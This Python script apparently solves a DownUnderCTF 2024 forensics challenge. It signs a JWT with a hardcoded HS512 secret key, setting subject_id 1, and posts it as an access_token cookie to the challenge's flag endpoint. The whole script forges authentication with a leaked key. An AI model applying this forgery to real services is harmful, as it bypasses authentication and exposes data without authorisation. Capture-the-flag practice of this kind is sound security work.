import jwt

header = {"typ": "JWT","alg": "HS512"}
payload = {"subject_id":1,"exp":1730300990}

secret_key = "3gHsCBkpZLi99zyiPqfY/NfFJqZzmNL4BAhYN8rAjRn49baTcnmyGISLD6T58XcWIUYrBfltI2iq2N6OHQSrfqBRFxFta61PvmnfRyn8Ep8T55lvLT8Es62kN3x35Bcb0OZmOGmM/zKf2qadcBq3Nbq1MiIVKJMz4w3JOk4orwFPtSNpNh8uaSQQUNMKTT6cvD9bvRvFNeeHYSPhDFwayPIRr5TJ+BpIRTUTfc1C3WCKoOuXCz2t+ISZo5yYwZ6U5w7NKFTTuDqMP/dXevkVykuntdej55XE3fsCP+UVFUT2JrY+Z9Q1aKTgavQR5smYVn93RlpbFwCoSStoANnoi"

jwt_token = jwt.encode(payload, secret_key, headers=header, algorithm="HS512")

print(jwt_token)


def convert_unicode_escape_to_ascii(input_string):
    decoded_string = input_string.encode().decode("unicode_escape")

    return decoded_string


# exit(0)
import requests

cookies = {
    # "access_token": "eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs",
    "access_token": jwt_token,
}

headers = {}

response = requests.post(
    "https://forensics-emuc2-b6abd8652aa4.2024.ductf.dev/api/flag/", cookies=cookies, headers=headers
)
# print(response.text)
print(convert_unicode_escape_to_ascii(response.text))
# print(response.headers)
# print(response.cookies)
# print(response.status_code)
